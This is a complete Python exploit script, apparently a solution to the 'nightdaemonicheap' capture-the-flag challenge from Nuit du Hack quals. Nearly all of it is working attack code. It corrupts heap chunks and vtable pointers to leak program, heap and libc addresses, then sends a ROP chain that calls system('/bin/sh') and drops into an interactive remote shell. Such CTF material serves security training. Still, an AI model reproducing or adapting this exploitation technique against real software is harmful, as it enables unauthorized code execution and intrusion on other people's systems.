#!/usr/bin/env python

import socket
import struct
from telnetlib import *
import time

pack64 = lambda x : struct.pack( "<Q", x )
unpack64 = lambda x : struct.unpack( "<Q", x )[0]


HOST = 'nightdaemonicheap.quals.nuitduhack.com'
PORT = 55550

puts_plt = 0x00000000000010F0
puts_got = 0x0000000000203F00

read_got = 0x0000000000203F28
system_offset = 0x00000000000443d0

libc_start_main_got = 0x0000000000203F38

libc_start_main_offset = 0x0000000000020950	#approximate value

def recvuntil(t):
	data = ''
	while not data.endswith(t):
		tmp = s.recv(1)
		if not tmp: break
		data += tmp
	return data


s = socket.create_connection((HOST, PORT))

print recvuntil('>')


####################################################

########## init heap ###############################

####################################################


s.send('new wizzard ' + '0'*0x7 + '\n')
recvuntil('>')

s.send('new wizzard ' + '1'*16 + '\n')		#1
recvuntil('>')

s.send('new wizzard ' + 'a'*0x14f + '\n')	#2
recvuntil('>')

s.send('new wizzard ' + '3'*0x10 + '\n')	#3
recvuntil('>')

s.send('new wizzard ' + '4'*0x10 + '\n')	#4
recvuntil('>')

s.send('new wizzard ' + 'A'*0x1ff + '\n')	#5
recvuntil('>')

s.send('new wizzard ' + '6'*0x10 + '\n')	#6
recvuntil('>')

s.send('new wizzard ;/bin/sh;\n')
recvuntil('>')

#####################################################

########## leak base address ########################

####################################################

s.send('delete W' + 'a'*0x14f + '\n') # free 2
recvuntil('>')

s.send('delete W' + '1'*16 + '\n') # free 1
recvuntil('>')

s.send('new wizzard ' + '\xf1'*24 + '\n') # overwrite freed heap chunk size
recvuntil('>')

s.send('new wizzard ' + 'c'*23 + '\xf1'  + '\n') # alloc 2-1
recvuntil('>')

s.send('new wizzard ' + 'd'*16  + '\n') # alloc 2-2
recvuntil('>')

s.send('change W' + 'd'*16 + ' ' + 'e'*0x3e + 'kk' + '\x48' + '\n') # overwrite LSB of #3 vtable to avoid vtable is overwritten by next heapchunk
recvuntil('\n')

s.send('print all\n')	# leak base address
recvuntil('kk')

leak2 = recvuntil('\n')
leak = leak2[:-1]
print_wizard = leak + '\x00' * (8 - len(leak))

base = unpack64(print_wizard) - 0x0000000000203C48
print 'base : 0x%x' % base

recvuntil('>')

#####################################################

########## leak heap address ########################

####################################################

s.send('delete W' + 'A'*0x1ff + '\n') # free 5
recvuntil('>')

s.send('delete W' + '4'*0x10 + '\n') # free 4
recvuntil('>')

s.send('new wizzard ' + '\xe1'*24 + '\n') # overwrite 4
recvuntil('>')

s.send('new wizzard ' + 'C'*16  + '\n') # alloc 5-1
recvuntil('>')

s.send('new wizzard ' + 'D'*0x10  + '\n') # alloc 5-2
recvuntil('>')

s.send('new wizzard ' + 'E'*0x8  + '\n') # alloc 5-3 / #6's vtable will overwritten by 5-3's name pointer
recvuntil('>')

s.send('change W' + 'E'*0x8 + ' ' + pack64(base + puts_plt) + '\n') # rdi = this
recvuntil('>')

s.send('print all\n')
recvuntil('smartness: 10\n')

heap = recvuntil('\n')[:-1]
heap_base = heap + '\x00' * (8-len(heap))

heap_base = unpack64(heap_base) - 0xac0
print 'heap_base :  0x%x' % heap_base

recvuntil('>')

#####################################################

########## leak any address ########################

####################################################

s.send('delete ' + 'e'*0x3e + 'kk' + print_wizard[:-2] + '\n') # delete 2-2
recvuntil('>')

s.send('new wizzard ' + 'f'*0x47 + '\x40' + '\n') # alloc 2-2 , overwrite LSB of 3 string size
recvuntil('>')

s.send('change W' + '3'*0x10 + ' ' + '3'*0x28 + '\x18\x01' + '\n') # overwrite 4 string size to 0x130
recvuntil('>')

s.send('change W' + '\xe1'*0x17 + '\x01\x01' + ' ' + '4'*0x110 + pack64(heap_base+0x1b0) + '\n') # overwrite 5-1 string pointer to 0 string pointer address
recvuntil('>')

s.send('change ' + '3'*0x28 + '\x18\x01' + ' ' + '3'*0x28 + '\x30' + '\n') # set 4 string size to 0x30 ( shrink size to prevent memory set to 0 by strncpy )
recvuntil('>')

s.send('change ' + '4'*0x110 + pack64(heap_base+0x1b0) + ' ' + '4'*0x28 + '\x08' + '\n') # set 5 string size to 8
recvuntil('>')

s.send('change ' + '3'*0x28 + '\x30' + ' ' + '3'*0x28 + '\x28' + '\n') # set 4 string size to 0x28
recvuntil('>')

s.send('change ' + '4'*0x110 + pack64(heap_base+0x1b0) + ' ' + '4'*0x20 + print_wizard + '\n') # recover 5 vtable
recvuntil('>')

s.send('change ' + pack64(heap_base+0x1c0) + ' ' + pack64(heap_base+0x560) + '\n') # set 0 string pointer to 4 vtable
recvuntil('>')

s.send('change ' + 'f'*8 + '\x40' + ' ' + print_wizard + '\n') # recover 4 vtable
recvuntil('>')

s.send('change ' + pack64(heap_base+0x560) + ' ' + pack64(heap_base+0x680) + '\n') # set 0 string pointer to 3 vtable
recvuntil('>')

s.send('change ' + '3'*8 + '\x28' + ' ' + print_wizard + '\n') # recover 3 vtable
recvuntil('>')

s.send('change ' + pack64(heap_base+0x680) + ' ' + pack64(base+libc_start_main_got) + '\n') # set 0 string pointer to libc_start_main got
recvuntil('>')

s.send('print all\n')
recvuntil('My name is : ')
libc_start_main_addr = recvuntil('\n')[0:-1]
libc_start_main_addr = libc_start_main_addr + '\x00' * (8-len(libc_start_main_addr))

print "libc_start_main_addr : %x" % unpack64(libc_start_main_addr)
libc_base = unpack64(libc_start_main_addr) - libc_start_main_offset + 0x4c0
print "libc_base : %x" % libc_base
recvuntil('>')

s.send('change ' + pack64(base+libc_start_main_got) + ' ' + pack64(base + read_got) + '\n')
recvuntil('>')

s.send('print all\n')

recvuntil('My name is : ')
read_addr = recvuntil('My')[0:-3] + '\x00\x00'
print "read_addr : 0x%x" % unpack64(read_addr)
recvuntil('>')


#leak system address searching from libc_start_main_addr+0x20001 ( avoid null byte )
'''
s.send('change ' + pack64(base+read_got)[0:-2] + ' ' + pack64(unpack64(libc_start_main_addr)+0x20001) + '\n')

s.send('print all\n')

recvuntil('My name is : ')
print  recvuntil('My')[0:-3].encode('hex')
recvuntil('>')


prev = pack64(unpack64(libc_start_main_addr)+0x20001)
i = 0x10

while True:
	print "%x" % unpack64(prev)
	next = pack64(unpack64(libc_start_main_addr)+0x20001+i)
	
	s.send('change ' + prev + ' ' + next + '\n')
	prev = next

	print recvuntil('>')

	s.send('print all\n')

	recvuntil('My name is : ')
	result = recvuntil('My')[0:-3]
	recvuntil('>')

	if result.find('\x85\xff\x74\x0b') != -1:
		print 'system offset libc_start_main+0x20000+' + hex(i)
		break
	i = i + 0x10
'''


system_addr = pack64(unpack64(libc_start_main_addr)+0x23910)

print 'system_addr : 0x%x' % unpack64(system_addr)


#####################################################

########## get shell ###############################

####################################################

sh_addr = pack64(heap_base + 0xcd2)
poprdi = pack64(base+0x0000000000001cef)
addrsp = pack64(unpack64(read_addr) + 0x129)

s.send('change ' + pack64(base + puts_plt) + ' ' + addrsp + '\n') # 
print recvuntil('>')

s.send( 'print all       ' + pack64(base+0x0000000000001B2F)*0x26 + poprdi + sh_addr  + system_addr + '\n')


t = Telnet()
t.sock = s
t.interact()

